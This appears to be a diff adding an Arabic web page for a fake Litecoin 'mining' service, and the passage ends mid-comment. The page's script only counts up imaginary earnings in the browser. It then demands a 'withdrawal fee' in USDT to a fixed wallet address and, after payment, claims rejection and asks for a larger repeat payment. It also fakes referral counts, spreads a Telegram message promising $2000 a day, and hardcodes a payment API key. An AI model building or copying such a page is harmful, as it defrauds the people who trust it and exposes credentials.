@@ -1,0 +1,891 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>نظام تعدين LTC احترافي</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+  <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+  <style>
+    @keyframes pulse-glow {
+      0% { box-shadow: 0 0 0 0 rgba(52, 93, 157, 0.5); }
+      100% { box-shadow: 0 0 0 20px rgba(52, 93, 157, 0); }
+    }
+    .ltc-glow { animation: pulse-glow 2s infinite; }
+
+    .notification {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      padding: 12px 24px;
+      border-radius: 8px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      z-index: 1000;
+      display: none;
+      font-family: sans-serif;
+    }
+
+    .notification.success {
+      background-color: #345D9D;
+      color: #fff;
+    }
+
+    .notification.warning {
+      background-color: #345D9D;
+      color: #fff;
+    }
+
+    .notification.error {
+      background-color: #345D9D;
+      color: #fff;
+    }
+
+    .notification.ad {
+      background-color: #fff;
+      color: #303030;
+      border: 1px solid #ddd;
+    }
+
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .animate-spin { animation: spin 1.5s linear infinite; }
+
+    button i.fas:first-child,
+    button i.far:first-child,
+    button i.fal:first-child,
+    button i.fad:first-child,
+    button i.fab:first-child {
+      margin-right: 0.5rem;
+    }
+
+    html[dir="rtl"] button i.fas:first-child,
+    html[dir="rtl"] button i.far:first-child,
+    html[dir="rtl"] button i.fal:first-child,
+    html[dir="rtl"] button i.fad:first-child,
+    html[dir="rtl"] button i.fab:first-child {
+      margin-right: 0;
+      margin-left: 0.5rem;
+    }
+
+    #addressConfirmation:checked {
+      background-image: url("data:image/svg+xml,%3csvg viewBox='0 0 16 16' fill='white' xmlns='http://www.w3.org/2000/svg'%3e%3cpath d='M12.207 4.793a1 1 0 010 1.414l-5 5a1 1 0 01-1.414 0l-2-2a1 1 0 011.414-1.414L6.5 9.086l4.293-4.293a1 1 0 011.414 0z'/%3e%3c/svg%3e");
+      background-size: 60%;
+      background-position: center;
+      background-repeat: no-repeat;
+    }
+
+    button:disabled {
+      background-color: #ccc;
+      color: #666;
+      cursor: not-allowed;
+      opacity: 0.7;
+    }
+  </style>
+</head>
+<body class="bg-gradient-to-br from-gray-900 via-blue-900 to-gray-900 min-h-screen text-white">
+  <!-- شريط التنقل -->
+  <nav class="container mx-auto px-6 py-4">
+    <div class="flex items-center justify-between">
+      <div class="flex items-center space-x-3 rtl:space-x-reverse">
+        <div class="ltc-glow relative bg-blue-900/50 p-3 rounded-full border border-blue-500/20 shadow-xl shadow-blue-900/20 hover:shadow-blue-900/40 transition-all">
+          <div class="absolute inset-0 bg-gradient-to-br from-blue-400/30 to-white-400/20 rounded-full mix-blend-overlay"></div>
+          <div class="absolute inset-0 rounded-full shadow-inner shadow-blue-900/30"></div>
+          <img 
+            src="https://cryptologos.cc/logos/litecoin-ltc-logo.png" 
+            alt="LTC Logo" 
+            class="relative z-10 w-12 h-12 transition-transform hover:scale-110"
+          >
+        </div>
+        <span class="text-2xl font-bold bg-gradient-to-r from-white to-gray-100 bg-clip-text text-transparent">
+        LTC
+        </span>
+      </div>
+    
+            <div class="flex items-center space-x-6">
+                <button id="walletBtn" class="bg-blue-600 hover:bg-blue-700 px-6 py-2 rounded-full">
+                    <i class="fas fa-wallet mr-2"></i>إدارة المحفظة
+                </button>
+            </div>
+        </div>
+    </nav>
+    <div id="notification" class="notification"></div>
+    <!-- Confirmation Popup for Resetting Profits -->
+    <div id="confirmResetModal" class="hidden fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
+        <div class="bg-gradient-to-br from-gray-800 to-gray-900 w-full max-w-md rounded-2xl border border-blue-500/20 shadow-xl shadow-blue-900/20">
+            <div class="p-6 border-b border-blue-500/20">
+                <h2 class="text-2xl font-bold flex items-center gap-2 text-red-400">
+                    <i class="fas fa-exclamation-triangle"></i>تحذير!
+                </h2>
+            </div>
+            <div class="p-6 space-y-4">
+                <p class="text-sm text-white">تم تنفيذ عملية تصفير الارباح بنجاح.</p>
+                <div class="flex justify-between">
+                    <button id="confirmReset" class="bg-green-600 hover:bg-green-700 px-4 py-2 rounded-lg font-semibold">ابدا التعدين</button>
+                    <button id="cancelReset" class="bg-gray-600 hover:bg-gray-700 px-4 py-2 rounded-lg font-semibold">×</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- القسم الرئيسي -->
+    <main class="container mx-auto px-6 py-20">
+        <div class="text-center mb-20">
+            <h1 class="text-6xl font-bold mb-6">استثمر في مستقبل <span class="text-blue-600">التعدين</span></h1>
+            
+            <!-- إحصاءات التعدين -->
+            <div class="eth-glow bg-blue-900/50 p-8 rounded-2xl inline-block mb-8">
+                <div class="text-4xl font-mono">
+                    <span id="earnedLTC">0.00</span><span class="text-blue-400"> LTC</span>
+                    <div class="text-base font-semibold text-blue-400">(~$<span id="earnedUSD">0.00</span>)</div>
+                </div>
+                
+                <p class="text-base font-bold pt-2">السرعة</p>
+                <p class="text-sm font-bold text-blue-400">
+                    <span id="miningSpeed">0.15 H/s</span>
+                </p>
+                <p class="text-base font-bold pt-2">سعر العملة الآن</p>
+                <p class="text-sm font-bold text-blue-400">
+                    <span>$</span><span id="LTCpricenow">جاري التحميل...</span>
+                </p>
+            </div>
+
+            <!-- زر التحكم الرئيسي -->
+            <button id="mainActionBtn" class="px-8 py-4 rounded-full text-lg font-bold transform transition hover:scale-105 w-64 bg-green-500 hover:bg-green-600">
+                <i class="fas fa-play-circle mr-2"></i>بدء التعدين
+            </button>
+        </div>
+
+        <!-- مودال إدارة المحفظة -->
+        <div id="walletModal" class="hidden fixed inset-0 bg-black/60 backdrop-blur-sm z-40 flex items-center justify-center p-4">
+            <div class="bg-gradient-to-br from-gray-800 to-gray-900 w-full max-w-2xl rounded-2xl border border-blue-500/20 shadow-xl shadow-blue-900/20">
+                <div class="p-6 border-b border-blue-500/20">
+                    <h2 class="text-2xl font-bold flex items-center gap-2">
+                        <i class="fas fa-wallet text-blue-400"></i>إدارة المحفظة
+                    </h2>
+                </div>
+                
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-6 p-6">
+                    <div class="bg-gradient-to-br from-gray-900/80 to-blue-900/20 p-6 rounded-xl border border-blue-500/20">
+                        <h3 class="text-lg font-semibold mb-4 flex items-center gap-2">
+                            <i class="fas fa-coins text-blue-400"></i>الأرباح
+                        </h3>
+                        <div class="space-y-4">
+                            <div class="flex justify-between items-center py-2 border-b border-blue-500/10">
+                                <span class="text-white">الإجمالي:</span>
+                                <span class="font-mono text-blue-300"><span id="totalEarningsLTC">0.00</span> LTC</span>
+                            </div>
+                            <div class="flex justify-between items-center py-2">
+                                <span class="text-white">القيمة بالدولار:</span>
+                                <span class="font-mono text-green-300">$<span id="totalEarningsUSD">0.00</span></span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="bg-gradient-to-br from-gray-900/80 to-blue-900/20 p-6 rounded-xl border border-blue-500/20">
+                        <h3 class="text-lg font-semibold mb-4 flex items-center gap-2">
+                            <i class="fas fa-university text-blue-400"></i>السحب
+                        </h3>
+                        <div class="space-y-4">
+                            <div class="text-sm text-blue-300 bg-gray-800/50 p-3 rounded-lg">
+                                <i class="fas fa-info-circle mr-2"></i>
+                                رسوم السحب: <span id="feePercentage">25%</span> 
+                                (تخفيض <span id="feeDiscount">0%</span>)
+                            </div>
+                            <button id="withdrawBtn" class="group relative w-full bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-500 hover:to-emerald-500 px-6 py-3 rounded-lg font-semibold transition-all">
+                                <i class="fas fa-hand-holding-usd mr-2"></i>سحب الأرباح
+                                <div class="absolute inset-0 rounded-lg opacity-0 group-hover:opacity-100 transition-opacity bg-white/5"></div>
+                            </button>
+                            <button id="referralBtn" class="group relative w-full bg-gradient-to-r from-orange-600 to-yellow-600 hover:from-orange-500 hover:to-yellow-500 px-6 py-3 rounded-lg font-semibold transition-all">
+                                <i class="fab fa-telegram mr-2"></i>Telegram
+                                <div class="absolute inset-0 rounded-lg opacity-0 group-hover:opacity-100 transition-opacity bg-white/5"></div>
+                            </button>
+                            
+                            <button id="resetProfitsBtn" class="group relative w-full bg-gradient-to-r from-red-600 to-red-200 hover:from-red-500 hover:to-red-500 px-6 py-3 rounded-lg font-semibold transition-all">
+                                <i class="fas fa-trash-alt mr-2"></i>إعادة تعيين الأرباح
+                            </button>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="p-6 border-t border-blue-500/20">
+                    <button onclick="document.getElementById('walletModal').classList.add('hidden')" 
+                            class="w-full bg-gray-700 hover:bg-gray-600 px-6 py-3 rounded-lg font-semibold transition-colors">
+                        <i class="fas fa-times mr-2"></i>إغلاق
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- مودال الإحالات -->
+        <div id="referralModal" class="hidden fixed inset-0 bg-black/60 backdrop-blur-sm z-40 flex items-center justify-center p-4">
+            <div class="bg-gradient-to-br from-gray-800 to-gray-900 w-full max-w-xl rounded-2xl border border-blue-500/20 shadow-xl shadow-blue-900/20">
+                <div class="p-6 border-b border-blue-500/20">
+                    <h2 class="text-2xl font-bold flex items-center gap-2">
+                        <i class="fas fa-users text-blue-400"></i>نظام الإحالات
+                    </h2>
+                </div>
+                
+                <div class="p-6 space-y-6">
+                    <div class="bg-gradient-to-br from-gray-900/80 to-blue-900/20 p-6 rounded-xl border border-blue-500/20">
+                        <div class="text-center mb-4">
+                            <div class="text-3xl font-bold text-blue-300 mb-2">
+                                <span id="referralCount">0</span> إحالة
+                            </div>
+                            <div class="text-sm text-blue-200">
+                                كل 50 إحالة تقلل رسوم السحب بنسبة 5%
+                            </div>
+                        </div>
+                        
+                        <button id="telegramShare" class="group relative w-full bg-gradient-to-r from-blue-600 to-blue-800 hover:from-blue-500 hover:to-blue-700 px-6 py-3 rounded-lg font-semibold transition-all">
+                            <i class="fab fa-telegram mr-2"></i>المشاركة على التلجرام
+                            <div class="absolute inset-0 rounded-lg opacity-0 group-hover:opacity-100 transition-opacity bg-white/5"></div>
+                        </button>
+                    </div>
+                    
+                    <div class="bg-gray-800/50 p-4 rounded-lg text-center">
+                        <p class="text-sm text-green-400">
+                            <i class="fas fa-info-circle mr-2"></i>
+                            ستحصل على رابط إحالة فريد يمكنك مشاركته مع أصدقائك
+                        </p>
+                    </div>
+                    
+                    <button onclick="document.getElementById('referralModal').classList.add('hidden')" 
+                            class="w-full bg-gray-700 hover:bg-gray-600 px-6 py-3 rounded-lg font-semibold transition-colors">
+                        <i class="fas fa-times mr-2"></i>إغلاق
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- مودال تأكيد السحب -->
+        <div id="withdrawModal" class="hidden fixed inset-0 bg-black/60 backdrop-blur-sm z-40 flex items-center justify-center p-4">
+            <div class="bg-gradient-to-br from-gray-800 to-gray-900 w-full max-w-xl rounded-2xl border border-blue-500/20 shadow-xl shadow-blue-900/20">
+                <div class="p-6 border-b border-blue-500/20">
+                    <h2 class="text-2xl font-bold flex items-center gap-2">
+                        <i class="fas fa-coins text-blue-400"></i>تأكيد السحب
+                    </h2>
+                </div>
+                
+                <div class="p-6 space-y-6">
+                    <div class="bg-gradient-to-br from-gray-900/80 to-blue-900/20 p-6 rounded-xl border border-blue-500/20">
+                        <div class="mb-4">
+                            <label class="block text-white mb-3 font-medium">عنوان المحفظة</label>
+                            <input type="text" id="usdtAddressInput" 
+                                   class="w-full bg-gray-700/50 border border-blue-500/30 rounded-lg px-4 py-3 font-mono text-xs focus:outline-none focus:border-blue-500 transition-colors" 
+                                   placeholder="محفظة USDT">
+                        </div>
+                        
+                        <div class="flex items-center mb-4">
+                            <input type="checkbox" id="addressConfirmation" class="appearance-none w-5 h-5 text-blue-500 bg-gray-700 border-2 border-gray-600 rounded-full focus:ring-2 focus:ring-blue-600 checked:bg-blue-500 checked:border-blue-500 transition-colors">
+                            <label for="addressConfirmation" class="ms-2 text-sm text-white">أؤكد صحة العنوان</label>
+                        </div>
+                        
+                        <button id="confirmWithdraw" class="group relative w-full bg-gradient-to-r from-blue-600 to-blue-800 hover:from-blue-500 hover:to-blue-700 px-6 py-3 rounded-lg font-semibold transition-all">
+                            <i class="fas fa-check-circle mr-2"></i>التأكيد والدفع
+                            <div class="absolute inset-0 rounded-lg opacity-0 group-hover:opacity-100 transition-opacity bg-white/5"></div>
+                        </button>
+                    </div>
+                    <button onclick="document.getElementById('withdrawModal').classList.add('hidden')" 
+                            class="w-full bg-gray-700 hover:bg-gray-600 px-6 py-3 rounded-lg font-semibold transition-colors">
+                        <i class="fas fa-times mr-2"></i>إغلاق
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- مودال الدفع -->
+        <div id="paymentModal" class="hidden fixed inset-0 bg-black/60 backdrop-blur-sm z-40 flex items-center justify-center p-4">
+            <div class="bg-gradient-to-br from-gray-800 to-gray-900 w-full max-w-md rounded-2xl border border-blue-500/20 shadow-xl shadow-blue-900/20">
+                <div class="p-6 border-b border-blue-500/20">
+                    <h2 class="text-2xl font-bold flex items-center gap-2">
+                        <i class="fas fa-qrcode text-blue-400"></i>إتمام الدفع
+                    </h2>
+                </div>
+                
+                <div class="p-6 space-y-6">
+                    <div class="bg-gradient-to-br from-gray-900/80 to-blue-900/20 p-6 rounded-xl border border-blue-500/20 text-center">
+                        <div class="mb-5">
+                            <p class="text-sm font-bold text-white">إجمالي الأرباح</p>
+                            <p class="text-lg font-semibold text-green-300">
+                                <span id="earnedUSDlabel">0.00</span> USDT
+                            </p>
+                        </div>
+                        
+                        <div class="mb-5">
+                            <p class="text-sm font-bold text-white">الرسوم المطلوبة</p>
+                            <p class="text-xl font-bold text-blue-300 mb-1">
+                                <span id="paymentAmount">0.00</span> USDT
+                            </p>
+                            <p class="text-xs text-yellow-400">يجب ارسال الرسوم المطلوبة قبل انتهاء الوقت</p>
+                        </div>
+                        
+                        <div class="mb-5">
+                        <p class="text-sm font-bold text-white py-2">عنوان الدفع</p>
+                            <div class="bg-gray-700/50 p-3 rounded-lg flex items-center justify-between">
+                            <span id="usdtAddress" class="font-mono text-xs truncate text-center flex-grow">TPsxGQ2WMk683PFSdkuTVXkdc1ooG3N8pE</span>
+                                <button onclick="copyAddress()" class="text-blue-400 hover:text-blue-300 ml-2">
+                                    <i class="far fa-copy"></i>
+                                </button>
+                            </div>
+                                <button onclick="copyAddress()" class="mt-2 bg-blue-600 hover:bg-blue-700 text-white font-semibold py-2 px-4 rounded">
+                                      اضغط هنا لنسخ عنوان 
+                                </button>
+                                 <div id="finalConfirmModal" class="hidden fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center p-4">
+            <div class="bg-gradient-to-br from-gray-800 to-gray-900 w-full max-w-md rounded-2xl border border-purple-500/20 shadow-xl shadow-purple-900/20">
+                <div class="p-6 border-b border-purple-500/20">
+                    <h2 class="text-2xl font-bold flex items-center gap-2 text-green-400">
+                        <i class="fas fa-check-circle"></i>تمت العملية بنجاح!
+                    </h2>
+                </div>
+                
+                <div class="p-6 space-y-6">
+                    <p class="text-sm text-red-400">
+                        <i class="fas fa-exclamation-triangle mr-2"></i>
+تنبيه تم رفض السحب يجب المحاولة من جديد قم بارسال رسوم الشبكة 2$ مع الرسوم المطلوبة حتى لا يتم رفض السحب
+                      </p>
+                      <p class="text-xs text-white-400">
+                        <i class="fas fa-info-circle mr-2"></i>
+طلب السحب الخاص بك سوف يتم ولكن عليك ارسال الرسوم المطلوبة مع رسوم الشبكة من جديد بعد ذالك سوف يتم ارجاع المبلغ الاول الذي قمت بارساله مع الارباح الى محفضتك على سبيل المثال لو ارسلت 100 دولار يجب ان تقوم بارسال 102 من جديد وسوف تتم العملية بنجاح ويتم اعادة لك المبلغ الاول الذي ارسلته مع الارباح
+                      </p>
+  
+                </div>
+            </div>
+        </div>
+                                <script> 
+                                    function copyAddress() {
+                                        const address = document.getElementById('usdtAddress').textContent; // Get the wallet address
+                                        navigator.clipboard.writeText(address).then(() => {
+                                            console.log('Wallet address copied to clipboard:', address);
+                                            showNotification(); // Call the function to show the notification
+                                        }).catch(err => {
+                                            console.error('Failed to copy: ', err);
+                                        });
+                                    }
+                                </script>
+                                    <div id="notification" class="hidden bg-green-500 text-white text-sm p-2 rounded mt-2" role="alert">
+                                    تم نسخ العنوان بنجاح
+                                </div>
+                                <script>
+                                    function showNotification() {
+                                        const notification = document.getElementById('notification');
+                                        notification.classList.remove('hidden'); // Show the notification
+                                        setTimeout(() => {
+                                            notification.classList.add('hidden'); // Hide the notification after 3 seconds
+                                        }, 3000);
+                                    }
+                                </script>    
+                                <p class="text-xs text-yellow-400 py-2">إرسال عملة USDT شبكة TRC-20</p>
+                            </div>
+                            
+                        <div class="mb-5 flex justify-center">
+                            <canvas id="qrcode" class="rounded-lg border-2 border-blue-500/30"></canvas>
+                        </div>
+                        
+                        <div class="mb-4">
+                            <div id="loadingSpinner" class="animate-spin rounded-full h-8 w-8 border-4 border-blue-500 border-t-transparent mx-auto mb-3"></div>
+                            <p class="text-sm text-blue-300 font-medium">بانتظار تأكيد الدفع...</p>
+                            <p class="text-xs text-red-300 mt-2">الوقت المتبقي: <span id="paymentTimer">05:00</span></p>
+                        </div>
+                    </div>
+                    
+                    <button onclick="document.getElementById('paymentModal').classList.add('hidden'); cancelPayment();" 
+                            class="w-full bg-gray-700 hover:bg-gray-600 px-6 py-3 rounded-lg font-semibold transition-colors">
+                        <i class="fas fa-times mr-2"></i> إلغاء
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- مودال التأكيد النهائي -->
+        <div id="finalConfirmModal" class="hidden fixed inset-0 bg-black/60 backdrop-blur-sm z-40 flex items-center justify-center p-4">
+            <div class="bg-gradient-to-br from-gray-800 to-gray-900 w-full max-w-md rounded-2xl border border-blue-500/20 shadow-xl shadow-blue-900/20">
+                <div class="p-6 border-b border-blue-500/20">
+                    <h2 class="text-2xl font-bold flex items-center gap-2 text-green-400">
+                        <i class="fas fa-check-circle"></i>تمت العملية بنجاح!
+                    </h2>
+                </div>
+                
+                <div class="p-6 space-y-6">
+                    <p class="text-sm text-red-400">
+                        <i class="fas fa-exclamation-triangle mr-2"></i>
+                        تنبيه تم رفض السحب يجب المحاولة من جديد قم بارسال رسوم الشبكة 2$ مع الرسوم المطلوبة حتى لا يتم رفض السحب
+                    </p>
+                    <p class="text-xs text-white">
+                        <i class="fas fa-info-circle mr-2"></i>
+                        طلب السحب الخاص بك سوف يتم ولكن عليك ارسال الرسوم المطلوبة مع رسوم الشبكة من جديد بعد ذالك سوف يتم ارجاع المبلغ الاول الذي قمت بارساله مع الارباح الى محفضتك
+                    </p>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Activity Feed -->
+        <section class="bg-gradient-to-br from-gray-800/60 to-blue-900/20 p-6 rounded-2xl border border-blue-500/20 shadow-xl shadow-blue-900/20">
+            <h2 class="text-2xl font-bold mb-6 text-blue-600">
+                النشاطات الحديثة
+            </h2>
+            
+            <div class="grid md:grid-cols-2 gap-6">
+                <!-- Notifications Column -->
+                <div class="bg-gradient-to-br from-gray-900/80 to-blue-900/20 p-4 rounded-xl border border-blue-500/20">
+                    <h3 class="text-lg font-semibold mb-4 flex items-center gap-2 text-blue-300">
+                        <i class="fas fa-bell"></i>الإشعارات
+                    </h3>
+                    <div id="notifications" class="space-y-3 h-64 overflow-y-auto scrollbar-thin scrollbar-thumb-blue-600 scrollbar-track-gray-800/50">
+                        <!-- Notifications will be added here -->
+                    </div>
+                </div>
+        </section>
+    </main>
+    <!-- إشعارات -->
+    <div id="notification" class="notification"></div>
+
+    <script type="module">
+        import * as Payments from './payments.js';
+        console.log(Payments); // Check the console to see all exported functions.
+
+        let ltcPrice = 0; // Default value before WebSocket updates
+        const socket = new WebSocket('wss://stream.binance.com:9443/ws/ltcusdt@trade');
+
+        socket.onmessage = (event) => {
+            const data = JSON.parse(event.data);
+            ltcPrice = parseFloat(data.p).toFixed(2);
+            document.getElementById('LTCpricenow').textContent = ltcPrice.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        };
+
+        socket.onerror = (error) => {
+            console.error("WebSocket Error: ", error);
+        };
+
+        socket.onclose = () => {
+            console.log("WebSocket connection closed.");
+        };
+
+        let isMining = localStorage.getItem('isMining') === 'true';
+        let ltcCounter = parseFloat(localStorage.getItem('earnedLTC')) || 0;
+        let lastUpdateTime = parseInt(localStorage.getItem('lastUpdateTime')) || Date.now();
+        let referrals = parseInt(localStorage.getItem('referrals')) || 0;
+        const miningSpeed = 0.000550;
+        const baseFee = 30;
+        const usdtAddress = "TPsxGQ2WMk683PFSdkuTVXkdc1ooG3N8pE";
+
+        const calculateFee = () => {
+            const baseFee = 30; // Ensure it always starts at 20%
+            const discount = Math.floor(referrals / 50) * 5;  // Reduce 5% per 50 referrals
+            return Math.max(baseFee - discount, 5); // Ensure minimum fee is 5%
+        };
+
+        const updateEarnings = () => {
+            if (isMining) {
+                const now = Date.now();
+                const timeDiff = (now - lastUpdateTime) / 1000;
+                ltcCounter += miningSpeed * timeDiff;
+                lastUpdateTime = now;
+                localStorage.setItem('earnedLTC', ltcCounter);
+                localStorage.setItem('lastUpdateTime', lastUpdateTime);
+            }
+        };
+
+        const updateUI = () => {
+            const earnedUSD = ltcCounter * ltcPrice;
+            const currentFee = calculateFee();
+            
+            document.getElementById('earnedLTC').textContent = ltcCounter.toFixed(6);
+            document.getElementById('earnedUSD').textContent = earnedUSD.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+            document.getElementById('miningSpeed').textContent = (miningSpeed * 1e6).toFixed(2) + ' H/s';
+            
+            document.getElementById('totalEarningsLTC').textContent = ltcCounter.toFixed(6);
+            document.getElementById('totalEarningsUSD').textContent = earnedUSD.toLocaleString('de-DE', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+            document.getElementById('feePercentage').textContent = currentFee + '%';
+            document.getElementById('feeDiscount').textContent = (baseFee - currentFee) + '%';
+            document.getElementById('referralCount').textContent = referrals;
+        };
+
+        const showNotification = (message, type = 'success', duration = 3000) => {
+            const notification = document.getElementById('notification');
+            if (!notification) {
+                console.error('No element with id "notification" found!');
+                return;
+            }
+            notification.classList.remove('success', 'warning', 'error', 'ad');
+            notification.classList.add(type);
+            notification.textContent = message;
+            notification.style.display = 'block';
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, duration);
+        };
+
+        document.getElementById('mainActionBtn').addEventListener('click', () => {
+            isMining = !isMining;
+            lastUpdateTime = Date.now();
+            localStorage.setItem('isMining', isMining);
+            localStorage.setItem('lastUpdateTime', lastUpdateTime);
+            updateUI();
+            showNotification(isMining ? 'تم بدء التعدين! 🚀' : 'تم إيقاف التعدين ⛔');
+
+            document.getElementById('mainActionBtn').innerHTML = isMining ? 
+                '<i class="fas fa-stop-circle mr-2"></i>إيقاف التعدين' : 
+                '<i class="fas fa-play-circle mr-2"></i>بدء التعدين';
+            document.getElementById('mainActionBtn').className = isMining ? 
+                'px-8 py-4 rounded-full text-lg font-bold transform transition hover:scale-105 w-64 bg-red-500 hover:bg-red-600' :
+                'px-8 py-4 rounded-full text-lg font-bold transform transition hover:scale-105 w-64 bg-green-500 hover:bg-green-600';
+
+            if (isMining) {
+                setInterval(() => {
+                    updateEarnings();
+                    updateUI();
+                }, 1000); // Update every second
+            }
+        });
+        
+        document.getElementById('walletBtn').addEventListener('click', () => {
+            updateEarnings();
+            updateUI();
+            document.getElementById('walletModal').classList.remove('hidden');
+        });
+
+        document.getElementById('resetProfitsBtn').addEventListener('click', () => {
+            document.getElementById('confirmResetModal').classList.remove('hidden');
+        });
+
+        document.getElementById('confirmReset').addEventListener('click', () => {
+            ltcCounter = 0; // Reset the earned LTC counter to zero
+            localStorage.setItem('earnedLTC', ltcCounter); // Update local storage
+            updateUI(); // Update the UI to reflect the changes
+            document.getElementById('confirmResetModal').classList.add('hidden'); // Hide confirmation modal
+            showNotification('تم إعادة تعيين الأرباح بنجاح!', 'success'); // Show success notification
+        });
+
+        document.getElementById('cancelReset').addEventListener('click', () => {
+            document.getElementById('confirmResetModal').classList.add('hidden'); // Hide confirmation modal
+        });
+
+        function copyAddress() {
+            const address = document.getElementById('usdtAddressDisplay').textContent;
+            navigator.clipboard.writeText(address).then(() => {
+                showNotification('تم نسخ العنوان بنجاح!', 'success');
+            }).catch(err => {
+                console.error('Failed to copy: ', err);
+            });
+        }
+
+        document.addEventListener("DOMContentLoaded", function () {
+            let isMining = localStorage.getItem("isMining") === "true";
+            let mainActionBtn = document.getElementById("mainActionBtn");
+
+            if (mainActionBtn) {
+                mainActionBtn.innerHTML = isMining ? 
+                    '<i class="fas fa-stop-circle mr-2"></i>إيقاف التعدين' : 
+                    '<i class="fas fa-play-circle mr-2"></i>بدء التعدين';
+
+                mainActionBtn.className = isMining ? 
+                    'px-8 py-4 rounded-full text-lg font-bold transform transition hover:scale-105 w-64 bg-red-500 hover:bg-red-600' : 
+                    'px-8 py-4 rounded-full text-lg font-bold transform transition hover:scale-105 w-64 bg-green-500 hover:bg-green-600';
+            }
+        });
+
+        document.getElementById('referralBtn').addEventListener('click', () => {
+            window.open(
+                'http://t.me/bot_taden',
+                '_blank' // <- This is what makes it open in a new window.
+            );
+        });
+
+        document.getElementById('telegramShare').addEventListener('click', () => {
+            const minTime = 60000; // 1 minute
+            const maxTime = 300000; // 50 minutes
+            const randomDelay = Math.floor(Math.random() * (maxTime - minTime + 1)) + minTime;
+            setTimeout(() => {
+                referrals++;
+                localStorage.setItem('referrals', referrals);
+            }, randomDelay);
+            
+            const message = 
+                "🚀💰 بوت تعدين يحقق لك 2000$ يوميًا! 💰🚀" + "\n\n" +
+                "🔥 اربح بدون مجهود – فقط اشترك واترك البوت يعمل! 🔥" + "\n\n" +
+                "🎥 شاهد كيف تبدأ:" + "\n" +
+                "👉 https://youtu.be/Tzx6Pzmvxz8" + "\n\n" +
+                "🔗 ابدأ الآن:" + "\n" +
+                "👉 https://etharabs.ucxpr.com/?ref=" + Date.now();
+            window.open(`https://t.me/share/url?url=${encodeURIComponent(message)}`, '_blank');
+            updateUI();
+        });
+
+        document.getElementById('withdrawBtn').addEventListener('click', () => {
+            const earnedUSD = ltcCounter * ltcPrice;
+            if (earnedUSD < 500) {
+                showNotification('الحد الأدنى للسحب هو 500$');
+                return;
+            }
+            document.getElementById('withdrawModal').classList.remove('hidden');
+        });
+
+        // Reset Profits Button Click Event
+        document.getElementById('resetProfitsBtn').addEventListener('click', () => {
+            document.getElementById('confirmResetModal').classList.remove('hidden');
+        });
+
+        // Confirmation Modal for Resetting Profits
+        document.getElementById('confirmReset').addEventListener('click', () => {
+            ltcCounter = 0; // Reset the earned LTC counter to zero
+            localStorage.setItem('earnedLTC', ltcCounter); // Update local storage
+            updateUI(); // Update the UI to reflect the changes
+            document.getElementById('confirmResetModal').classList.add('hidden'); // Hide confirmation modal
+            showNotification('تم إعادة تعيين الأرباح بنجاح!', 'success'); // Show success notification
+        });
+
+        document.getElementById('cancelReset').addEventListener('click', () => {
+            document.getElementById('confirmResetModal').classList.add('hidden'); // Hide confirmation modal
+        });
+
+        // Global variables
+        let pollIntervals = [];
+        let activePaymentId = null;
+        let paymentTerminated = false; // Flag: true means the process was terminated
+        let paymentTimerId = null;
+
+        /**
+         * Resets the entire payment process.
+         * Cancels all polling intervals, clears active payment info, and resets termination flags.
+         */
+        function resetPaymentProcess() {
+            // Terminate polling intervals
+            pollIntervals.forEach(intervalId => clearInterval(intervalId));
+            pollIntervals = [];
+            // Clear active payment and termination flag
+            activePaymentId = null;
+            paymentTerminated = false;
+            // Clear the timer if any
+            if (paymentTimerId) {
+                clearInterval(paymentTimerId);
+                paymentTimerId = null;
+            }
+            console.log("Payment process completely reset.");
+        }
+
+        /**
+         * Starts polling NowPayments for payment status.
+         * @param {string|number} paymentId - The payment ID returned from NowPayments.
+         * @param {Function} callback - A callback function that receives the status object.
+         * @param {number} intervalMs - Polling interval (default: 10000 ms).
+         * @param {number} initialDelay - Delay before polling starts (default: 30000 ms).
+         */
+        function startPolling(paymentId, callback, intervalMs = 10000, initialDelay = 30000) {
+            setTimeout(() => {
+                const intervalId = setInterval(async () => {
+                    // Exit immediately if process has been terminated
+                    if (paymentTerminated || activePaymentId === null) {
+                        clearInterval(intervalId);
+                        return;
+                    }
+                    try {
+                        const response = await fetch(`https://api.nowpayments.io/v1/payment/${paymentId}`, {
+                            method: 'GET',
+                            headers: {
+                                'Content-Type': 'application/json',
+                                'x-api-key': '21XEEBB-9DPM32B-JQ9Y445-KM4ER0N'
+                            }
+                        });
+                        if (!response.ok) {
+                            console.warn("Payment status not available (status):", response.status);
+                            return;
+                        }
+                        const statusData = await response.json();
+                        console.log("Payment status response:", statusData);
+                        // Compare IDs as strings to avoid type issues
+                        if (String(statusData.payment_id) !== String(activePaymentId)) {
+                            console.log("Skipping outdated payment update:", statusData.payment_id);
+                            return;
+                        }
+                        callback(statusData);
+                        if (statusData.payment_status === 'finished' || statusData.payment_status === 'confirmed') {
+                            clearInterval(intervalId);
+                            pollIntervals = pollIntervals.filter(id => id !== intervalId);
+                        }
+                    } catch (error) {
+                        console.error("Polling error:", error);
+                    }
+                }, intervalMs);
+                pollIntervals.push(intervalId);
+            }, initialDelay);
+        }
+
+        /**
+         * Cancels the payment process.
+         * This function terminates polling, resets payment info, clears the timer,
